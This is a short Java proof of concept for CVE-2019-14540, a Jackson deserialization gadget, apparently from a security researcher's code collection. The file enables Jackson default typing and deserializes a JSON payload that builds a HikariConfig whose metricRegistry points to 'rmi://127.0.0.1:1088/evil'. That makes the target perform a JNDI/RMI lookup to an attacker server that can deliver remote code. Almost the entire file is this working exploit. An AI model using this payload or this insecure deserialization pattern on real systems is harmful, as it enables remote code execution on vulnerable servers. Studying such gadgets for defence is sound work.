package com.firebasky.self;


import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class hikaricp {
    public static void main(String[] args) throws IOException {
        String json = "[\"com.zaxxer.hikari.HikariConfig\",{\"metricRegistry\":\"rmi://127.0.0.1:1088/evil\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object o = mapper.readValue(json, Object.class);
        mapper.writeValueAsString(o);//调用所有个 get 方法
    }
    /**
     * https://curz0n.github.io/2019/09/20/cve-2019-14540/#3-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE
     */
}
